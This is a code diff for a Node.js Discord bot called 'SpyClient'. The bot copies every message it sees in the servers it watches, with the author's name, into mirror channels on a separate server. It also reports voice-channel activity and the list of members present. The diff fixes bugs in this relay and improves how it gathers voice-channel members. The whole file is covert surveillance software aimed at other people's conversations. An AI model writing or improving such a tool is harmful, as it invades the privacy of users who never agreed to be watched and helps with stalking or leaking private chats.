@@ -4,6 +4,8 @@ const SpyClient = new discord.Client();
 const fs = require('fs');
 const config = require('./config.json');
 
+const data = [];
+
 SpyClient.on('message', async msg => {
     if (Object.keys(data).length >= 50) {
         //Append data the the array then remove the data and index 0; collect data from the end of the array or reverse in the web interface
@@ -18,8 +20,8 @@ SpyClient.on('message', async msg => {
             channel.send(`${msg.author}  (${msg.author.tag}) : ${msg.content}`)
         } else {
             // If the Channel exists but the Catagory does NOT Exist, Do This:
-            await mockClient.guilds.cache.get(config.mock.mockID).channels.create(msg.channel.parent.name, { type: 'category' }).then(NewCatagory => {
-                channel.setParent(NewCatagory)
+            await mockClient.guilds.cache.get(config.mock.mockID).channels.create(msg.channel.parent.name, { type: 'category' }).then(newCat => {
+                channel.setParent(newCat)
                 channel.send(`${msg.author}  (${msg.author.tag}) : ${msg.content}`)
             })
         }
@@ -27,16 +29,16 @@ SpyClient.on('message', async msg => {
         // If Channel Does NOT Exist, Do This:
         if (catagory) {
             // If the Channel Does NOT Exist but the Catagory DOES exist, Do This:
-            await mockClient.guilds.cache.get(config.mock.mockID).channels.create(msg.channel.name).then(NewChannel => {
-                NewChannel.setParent(catagory)
-                Newchannel.send(`${msg.author}  (${msg.author.tag}) : ${msg.content}`)
+            await mockClient.guilds.cache.get(config.mock.mockID).channels.create(msg.channel.name).then(newchan => {
+                newchan.setParent(catagory)
+                newchan.send(`${msg.author}  (${msg.author.tag}) : ${msg.content}`)
             })
         } else {
             // If the Channel Does NOT Exist AND the Catagory Does NOT Exist, Do This:
-            await mockClient.guilds.cache.get(config.mock.mockID).channels.create(msg.channel.name).then(NewChannel => {
-                Newchannel.send(`${msg.author}  (${msg.author.tag}) : ${msg.content}`)
-                mockClient.guilds.cache.get(config.mock.mockID).channels.create(msg.channel.parent.name, { type: 'category' }).then(NewCatagory => {
-                    NewChannel.setParent(NewCatagory);
+            await mockClient.guilds.cache.get(config.mock.mockID).channels.create(msg.channel.name).then(newchan => {
+                newchan.send(`${msg.author}  (${msg.author.tag}) : ${msg.content}`)
+                mockClient.guilds.cache.get(config.mock.mockID).channels.create(msg.channel.parent.name, { type: 'category' }).then(newCat => {
+                    newchan.setParent(newCat);
                 })
             })
         }
@@ -45,15 +47,27 @@ SpyClient.on('message', async msg => {
 
 SpyClient.on('voiceStateUpdate', (oldState, newState) => {
     if (config.mock.DATACHANNEL) {
-        let oldmem = "empty";
-        let newmem = "empty";
+        let channelInfo = [];
         try {
-            oldmem = oldState.channel.members.array().forEach(x => x.user.tag);
+            for (let i of oldState.channel.members.array()) {
+                channelInfo.push(i.user.tag);
+                channelInfo.push('\n');
+            }
         }catch{}
         try {
-            newmem = newState.channel.members.array().forEach(x => x.user.tag);
+            for (let i of newState.channel.members.array()) {
+                channelInfo.push(i.user.tag);
+                channelInfo.push('\n');
+            }
         }catch{}
-        mockClient.guilds.cache.get(config.mock.mockID).channels.cache.get(config.mock.DATACHANNEL).send(`**VC UPDATE:**\n\n>OLD STATE\n${oldmem}\n>NEW STATE\n${newmem}`)
+        let cName = null;
+        try {
+            cName = oldState.channel.name;
+        }
+        catch {
+            cName = newState.channel.name;
+        }
+        mockClient.guilds.cache.get(config.mock.mockID).channels.cache.get(config.mock.DATACHANNEL).send(`**VC UPDATE:**\nChannel name: ${cName}\nServer: ${oldState.guild.name}\n\n**Members in channel**\n${channelInfo.join("")}`);
     }
 });
 
@@ -62,7 +76,7 @@ SpyClient.on('ready', () => {
 });
 
 mockClient.on('ready', () => {
-    console.log(`Logged in as ${mockClient.user.username}`);
+    console.log(`Logged in as ${mockClient.user.username}`);    
 });
 
 module.exports = {
